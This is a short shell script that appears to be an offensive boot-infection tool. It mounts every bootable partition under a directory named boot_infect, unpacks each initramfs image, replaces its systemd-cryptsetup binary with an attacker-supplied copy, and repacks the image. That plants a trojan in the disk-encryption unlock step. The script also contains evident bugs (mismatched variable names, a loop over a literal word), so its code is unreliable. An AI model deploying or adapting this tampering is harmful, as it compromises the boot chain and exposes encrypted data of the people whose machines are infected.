#!/bin/sh

bootroot="/mnt/boot_infect"
mkdir -p $bootroot/boot

sector_lines="`/sbin/fdisk -l 2> /dev/null  | /bin/grep '^/dev/'`"
sectors=`echo "$sector_lines" | /bin/grep "\*" | /bin/sed 's#^\(/dev/[a-zA-Z1-9]*\).*#\1#'`
initrd_lines="`ls initramfs-3*.img`"
initrds=`echo "$initramfs_lines"`

for sector in $sectors; do
	mount $sector $bootroot/boot

	cd $bootroot/boot
	for initrd in initrds; do
		mkdir initramfs
		cd initramfs
		gunzip < ../$initrd | cpio -i
		cd lib/systemd
		cp $bootroot/systemd-cryptsetup .
		cd ../..
		find ./ | cpio -H newc -o > initrd.cpio
		gzip initrd.cpio
		mv initrd.cpio.gz ../$initrd
		cd ..
		rm -rf initramfs
	done	

	umount $bootroot/boot
done




